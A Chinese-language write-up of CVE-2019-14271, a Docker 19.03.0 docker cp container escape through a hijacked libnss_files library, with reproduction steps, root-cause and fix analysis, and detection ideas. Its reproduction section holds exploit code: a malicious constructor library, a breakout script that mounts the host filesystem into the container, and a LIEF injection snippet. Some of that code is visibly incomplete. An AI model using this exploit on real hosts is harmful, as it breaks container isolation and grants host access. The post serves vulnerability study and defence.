---
title: CVE-2019-14271 分析复现
date: 2022-11-15 20:20:12
tags: CVE复现
author: click
---
## 基础知识
### docker cp 流程
_插入链接_
_插入 commit 链接_
在 docker 19.03 中，为了解决 CVE-2018-15664 的问题，在从容器向宿主机复制文件，调用 `archive.TarWithOptions()` 前，使用 `realchroot()` 将 cwd 和 root 设置到 `container.BaseFS.Path()`（_attacker 不可控_），来避免容器中文件路径中存在符号链接解析，导致路径穿越的问题。
因此在 docker cp 从容器中向宿主机复制文件时，在调用 `archive.TarWithOptions()`（归根到底是调用到 `user.lookupUnixUid()` => `C.mygetpwuid_r()`，该函数是 nsswitch 动态库中 `getpwuid_r()` 函数的封装 ） 前，都 chroot 到了容器根目录中。
### Cgo
[https://chai2010.cn/advanced-go-programming-book/ch2-cgo/ch2-01-hello-cgo.html](https://chai2010.cn/advanced-go-programming-book/ch2-cgo/ch2-01-hello-cgo.html)
[https://go.dev/blog/cgo](https://go.dev/blog/cgo)
[Cgo 静态库和动态库](https://chai2010.cn/advanced-go-programming-book/ch2-cgo/ch2-09-static-shared-lib.html)
Cgo 实现了在 Go 中直接调用内嵌 c 代码的功能，Cgo 使用 gcc 来编译和链接 C 和 Go 桥接的代码。
包含了 Cgo 内容的 go 程序，如果在编译时没有指定静态编译方式（_1. 通过 CGO_ENABLED=0 2. 通过指定外部链接器和 static 标志_），则编译出的文件会是一个动态链接的二进制文件，执行到动态库中的函数时，会加载对应的依赖库。
[CGO_ENABLED 环境变量对 Go 静态编译机制的影响](https://juejin.cn/post/6844903619527983111)
### Go 导入包的查找顺序
不使用 `go mod` 管理（`GO111MODULE="off"`）：

- `vendor` 目录下的包
- `$GOPATH/src` 下的包
- $`GOROOT/src` 下的包（内置包的位置）

注意这时要么都使用 `vendor` 下的包，要么都使用 `$GOPATH` 下的包，不会混用

使用 `go mod` 管理（GO111MODULE="on"）

- 优先使用 `vendor` 目录下的包
- `$GOPATH/pkg/mod/` 下的包
- `$GOROOT/src 下的包`（内置包）

`vendor` 和 `pkg/mod` 下的包也不会混用
## 漏洞详情
### 简介
由于 docker cp 过程中，为了防止 CVE-2018-15664 这类路径穿越问题，在调用 docker-tar 和 docker-untar 中，进程根目录被 chroot 到了容器根目录中。在切换根目录操作之后，存在调用动态库中函数（`getpwuid_r()`）。
要注意此进程的相关上下文（ns 之类，除了进程的 root 目录）都属于宿主机（是一个高权限进程），而所执行的动态库函数是容器可控的。攻击者可以通过定制一个恶意动态库文件，在宿主机执行 docker cp 时，恶意动态库中的代码将会被宿主机执行，从而实现逃逸，也就是常见的 so 库劫持。
### 影响
静态编译版本不受影响
非静态编译的 19.03.0 <= docker < 19.03.1 受影响
## 漏洞复现
### 复现环境

- docker 19.03.0
```bash
root@click:~# docker version
# client 版本不限
Client: Docker Engine - Community
 Version:           20.10.21
 API version:       1.40
 Go version:        go1.18.7
 Git commit:        baeda1f
 Built:             Tue Oct 25 18:02:00 2022
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true

Server: Docker Engine - Community
 Engine:
  Version:          19.03.0
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.12.5
  Git commit:       aeac949
  Built:            Wed Jul 17 18:13:43 2019
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.6.12
  GitCommit:        a05d175400b1145e5e6a735a6710579d181e7fb0
 runc:
  Version:          1.1.4
  GitCommit:        v1.1.4-0-g5fd4c4d
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683

```

- lief
[https://github.com/lief-project/LIEF](https://github.com/lief-project/LIEF)
用来注入 so 库文件
### 复现过程

1. 编译一个恶意代码库文件（library），用来注入到会被调用到的 libnss_files-xx.so 文件中
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>

#define ORIGINAL_LIBNSS "/lib/x86_64-linux-gnu/libnss_files-2.27-origin.so"
#define LIBNSS_PATH "/lib/x86_64-linux-gnu/libnss_files.so.2"

bool is_priviliged();

__attribute__ ((constructor)) void back(void) {
    char *argv_break[2];
	// 检查是否为宿主机进程
    if (!is_priviliged())
        return;
	// 将原始 libnss_files 文件替换回来，在实验中，如果不替换回来会导致无限调用此恶意函数，因为 retry 调用
    rename(ORIGINAL_LIBNSS, LIBNSS_PATH);
	
	// 在子进程中执行恶意代码部分放到 breakout 脚本中，可以方便定义执行命令内容
    if (!fork()) {
        // child process
        argv_break[0] = strdup("/breakout");
        argv_break[1] = NULL;
        execve("/breakout", argv_break, NULL);
    }
    else {
        wait(NULL);
    }
    return;
}

// 通过检查容器中 /proc/self/exe 是否存在来判断是否为宿主机进程（特权进程）
bool is_priviliged() {
    FILE *proc_file_in_cnt = fopen("/proc/self/exe", "r");
    // process in conainer
    if (proc_file_in_cnt != NULL) {
        fclose(proc_file_in_cnt);
        return false;
    }
    // process in host
    return true;
}
```
```bash
gcc -shared -fPIC /tmp/evil.c -o /tmp/evil.out
```

2. 编写所要执行的恶意代码脚本 breakout，这里的逃逸效果选择将宿主机文件系统挂载到容器中
```c
#!/bin/bash
umount /host_proc; rm -rf /host_proc
umount /host_fs; rm -rf /host_fs

mkdir /host_proc
mount -t proc none /host_proc
cd /host_proc/1/root

mkdir /host_fs
mount --bind 
```

3. 将恶意库文件注入到 libnss_files-xx.so 中
```python
import lief

lib_file = lief.parse("")
lib_file.add_library("/tmp/evil.out")
lib_file.write("/tmp/libnss_files.so.2")
```

4. 将注入好的恶意库文件，所调用的 evil.out 库文件，breakout 逃逸脚本保存在容器中（当然也可以直接在容器中进行 1/2 两步）
```bash
docker cp /tmp/evil.out [cnt-id]:/tmp/
docker cp /tmp/libnss_files.so.2 [cnt-id]:/lib/x86_64-linux-gnu/
docker cp /tmp/breakout [cnt-id]:/tmp/
```

5. 执行 docker cp，从容器中复制文件到宿主机上，触发 docker-tar 执行，从而出发恶意代码被宿主机上下文进程执行。
```bash
docker cp [cnt-id]:/etc/passwd /tmp/
```

6. 验证恶意代码执行成功，宿主机 proc 文件系统被挂载到 /host_proc 上，宿主机根文件系统被挂载到容器中的 /host_fs 上。
```bash
# in container
ls /host_proc
...
ls /host_fs
...
```
## 漏洞分析
### docker cp 流程分析
见 CVE-2018-15664，其中部分细节有所不同，可以对比 docker 19.03.0 源码看。
### docker-tar 流程分析
根据 docker cp 的流程来看，可以看到在从容器向宿主机复制文件时，会通过 reexec 机制调用 docker-tar 命令。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1673315886373-4a7e050b-dcb0-45b1-92e1-357247081951.png#averageHue=%23323945&clientId=u6d5bcf8f-927a-4&from=paste&height=143&id=u9405c930&name=image.png&originHeight=286&originWidth=1946&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75098&status=done&style=none&taskId=u85a085e4-b04e-4593-b904-a4f0d7e3400&title=&width=973)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1673315933531-62ba4756-3961-4e53-9cbd-e7495f37cb01.png#averageHue=%23333a46&clientId=u6d5bcf8f-927a-4&from=paste&height=167&id=uf463e0f4&name=image.png&originHeight=334&originWidth=1666&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82286&status=done&style=none&taskId=ue461c675-c68d-4819-a394-355ff8a0fb3&title=&width=833)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1673316393208-b562eff6-75b9-474b-a94d-78495ce8cd41.png#averageHue=%23343b48&clientId=u6d5bcf8f-927a-4&from=paste&height=296&id=ub95bd8ac&name=image.png&originHeight=592&originWidth=1804&originalType=binary&ratio=1&rotation=0&showTitle=false&size=146755&status=done&style=none&taskId=u58d825ce-42e7-4f3f-9812-e8d832f3991&title=&width=902)
传入的第 2 个参数 `relSrc` 为容器中源文件的路径（相对于容器文件系统），第 3 个参数 `root` 为指定容器的根目录在宿主机上的路径。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1673316954458-52664b7a-29c7-470a-a94f-8447ee94ecc2.png#averageHue=%23323945&clientId=u6d5bcf8f-927a-4&from=paste&height=118&id=u8336e10b&name=image.png&originHeight=236&originWidth=1194&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59696&status=done&style=none&taskId=u31a83277-0615-4fc4-bb81-23ff836db08&title=&width=597)
跟进 `docker-tar` 注册的回调函数 `tar()` 中：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1673317048183-fc145870-008c-4674-9b21-c0e10a4a2982.png#averageHue=%23323845&clientId=u6d5bcf8f-927a-4&from=paste&height=480&id=u8e80487c&name=image.png&originHeight=1106&originWidth=1372&originalType=binary&ratio=1&rotation=0&showTitle=false&size=170364&status=done&style=none&taskId=u43f25312-66b3-4251-8528-1ced0d25d84&title=&width=596)
可以看到 docker-tar 执行时，**先通过 **`**realChroot()**`**（chroot 的包装）将进程根目录切换到容器目录下，随后调用 **`**archive.TarWithOptions()**`** 来打包容器中的源文件**。
archive.TarWithOptions() => addTarFile() => FileInfoHeader() => tar.FileInfoHeader() （在 docker 19.03 中这里的 tar 包是 go sdk 中的 archive/tar 内置包，而不是之前优先加载的 vendor 目录下的 archive/tar），其中的 sysStat 在 stat_unix.go 中注册：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677498924202-8a7b9fe7-8d81-42e7-81d0-5e66ff9d1520.png#averageHue=%23343b48&clientId=u39875295-6760-4&from=paste&height=403&id=u69546639&name=image.png&originHeight=1148&originWidth=1254&originalType=binary&ratio=2&rotation=0&showTitle=false&size=227443&status=done&style=none&taskId=ud03102d3-74dc-43ca-8d2e-adc8da8a832&title=&width=440)
sysStat 中调用了 user.LookupId() 及 user.LookupGroupId()，（os/user 库中的函数，就要注意是否调用了 cgo 内容）。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677500078607-43776019-7817-436f-b893-d2826176e1f4.png#averageHue=%23353c48&clientId=u39875295-6760-4&from=paste&height=295&id=u28685c93&name=image.png&originHeight=590&originWidth=1520&originalType=binary&ratio=2&rotation=0&showTitle=false&size=131375&status=done&style=none&taskId=u9bbf1637-c2d6-40cd-a7a6-e6bbceb7ba0&title=&width=760)
这两个函数的实现中包含了 cgo 部分(os/user/cgo_lookup_unix.go 中)，并函数实现在动态链接库 libnss_files.so 中：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677500236004-39f704ae-fa56-429f-a1ed-37bc09687bc5.png#averageHue=%23343a47&clientId=u39875295-6760-4&from=paste&height=164&id=u9579cc63&name=image.png&originHeight=446&originWidth=1442&originalType=binary&ratio=2&rotation=0&showTitle=false&size=95327&status=done&style=none&taskId=u6f01dbc7-11d0-438d-aeda-05355079bfa&title=&width=530)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677500742901-a4043cf3-08ef-445c-8be4-e5a9f561c7ad.png#averageHue=%233c4350&clientId=u39875295-6760-4&from=paste&height=88&id=u38b63940&name=image.png&originHeight=208&originWidth=1092&originalType=binary&ratio=2&rotation=0&showTitle=false&size=46361&status=done&style=none&taskId=ue98110ed-9506-4635-9820-37cc32388ae&title=&width=462)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677500606638-1f98c053-0f31-4f49-9f0b-5db86442ae94.png#averageHue=%23343b48&clientId=u39875295-6760-4&from=paste&height=165&id=u3cba1afa&name=image.png&originHeight=428&originWidth=1384&originalType=binary&ratio=2&rotation=0&showTitle=false&size=91304&status=done&style=none&taskId=ue79c94b8-165c-4b84-a5e3-7206cc755a9&title=&width=533)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677500719689-8d18d268-4e55-4a78-a838-09c20928b150.png#averageHue=%233d4451&clientId=u39875295-6760-4&from=paste&height=87&id=ua717f652&name=image.png&originHeight=198&originWidth=1052&originalType=binary&ratio=2&rotation=0&showTitle=false&size=42685&status=done&style=none&taskId=ub03986ca-56cb-4a25-8702-192d5d342c6&title=&width=462)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677500819868-2eb04b45-8a88-4487-ba46-cae5d9ce9235.png#averageHue=%233c414c&clientId=u39875295-6760-4&from=paste&height=80&id=uaa29061a&name=image.png&originHeight=178&originWidth=1104&originalType=binary&ratio=2&rotation=0&showTitle=false&size=63856&status=done&style=none&taskId=u16a3bfac-9a09-4106-a677-c3840dc82e4&title=&width=499)
在 cgo_lookup_unix.go 的 build tags 中可以看到
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677501711042-5866034e-aec6-475c-bcda-6e5ee6ccb894.png#averageHue=%23383f4b&clientId=u39875295-6760-4&from=paste&height=45&id=ucf0c2c02&name=image.png&originHeight=136&originWidth=1368&originalType=binary&ratio=2&rotation=0&showTitle=false&size=35287&status=done&style=none&taskId=u85782e26-0c5a-423c-ab1c-0602e7eeb3b&title=&width=451)
所以如果 dockerd 是动态编译版本，并且开启了 cgo，没有使用 osusergo tag，则运行到这里的时候会加载 /lib/x86_64-linux-gnu/libnss_files.so 来执行其中定义的 getpwuid_r/getgrgid_r 函数。**注意：此时进程的根目录已经切换到了容器中，所以加载的链接库也相应的是容器中的 so 文件！而这个 docker-tar 进程是一个高权限进程（宿主机 ns/cgroup，宿主机 cap），所以通过修改 so 库内容，会导致高权限进程的任意代码执行。**
### 静态编译版本是否受影响
静态编译版本中，使用了 osusergo build tag 保证了 os/user 包不会使用 cgo 内容，也就不会调用 so 库中的内容，所以不会受到影响：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677503712815-f0f4fe31-d560-4066-a897-e50648517ace.png#averageHue=%2339404d&clientId=u39875295-6760-4&from=paste&height=79&id=uff02219e&name=image.png&originHeight=158&originWidth=2038&originalType=binary&ratio=2&rotation=0&showTitle=false&size=65153&status=done&style=none&taskId=u8896a833-99c7-415f-aee2-8cad95b9ac7&title=&width=1019)
## 漏洞修复分析
### 缓解方案
在 docker 19.03.1 中，在执行 chroot 之前，通过调用链接库相关函数，提前加载了涉及到的 so 库文件。避免在 chroot 到容器环境中后从容器文件系统中获取 so 库文件。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677502941746-fecfb88d-c774-40db-a05a-56da366c42d5.png#averageHue=%23192820&clientId=u39875295-6760-4&from=paste&height=134&id=u9fd2833a&name=image.png&originHeight=338&originWidth=1374&originalType=binary&ratio=2&rotation=0&showTitle=false&size=61312&status=done&style=none&taskId=udc8daa0d-8d38-4cfc-889f-93ca25ecadb&title=&width=545)
但是如果宿主机上加载 libnss_files.so 失败，那么还是会在 chroot 到容器中尝试加载容器中的 so 文件。
### 修复方案
在 docker 18.09.8 之前，vendor 目录下包含 archive/tar 包，因此在上述 docker-tar 流程中会调用 vendor/archive/tar 包中的 sysUnix() 函数，而这个版本的 sysUnix() 函数不包含 cgo 内容，因此是不会掉用 so 库内容的，没有风险。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/2330752/1677504418418-dd1d5351-3b5e-45f4-b1e2-0d424a76cee8.png#averageHue=%2313161c&clientId=u39875295-6760-4&from=paste&height=274&id=ud29178cd&name=image.png&originHeight=548&originWidth=994&originalType=binary&ratio=2&rotation=0&showTitle=false&size=87341&status=done&style=none&taskId=u93591e6f-9109-4ec8-a81e-11484283e72&title=&width=497)
为了避免 19.03.0 动态链接版本中调用 go 内置 archive/tar 包中包含调用动态链接函数的 statUnix() 方法，在之后的版本中，将旧版本中 vendor 下的不包含 cgo 内容的 archive/tar 包还原了回来，这样优先加载 vendor 中的 statUnix() 方法，不会去调用动态链接函数。
## 思考

- 漏洞成因核心
高权限进程的执行内容被容器中内容污染，造成宿主机任意代码执行。
- 漏洞行为特征
以下两条可以以此作为运行时监控的事中告警依据：
   - docker 进程/容器外进程（高权限进程），在执行过程中调用了容器文件系统中的链接库文件/或其他文件
   - 在攻击成功后，会打开宿主机文件系统中的文件（排除掉挂载到容器中的 volume）
- 针对 docker 源码的审计
   - 检查 docker 依赖的 cgo 动态库文件，寻找调用库函数的时的上下文情况是否会暴露给容器
## 问题
bind mount 可以跨越 mnt namespace 吗？不可以
## 参考链接

- [https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/](https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)
- [https://github.com/moby/moby/issues/39449](https://github.com/moby/moby/issues/39449)
- [https://blog.csdn.net/s2603898260/article/details/105632270](https://blog.csdn.net/s2603898260/article/details/105632270)
- [https://github.com/moby/moby/pull/39612/files](https://github.com/moby/moby/pull/39612/files)

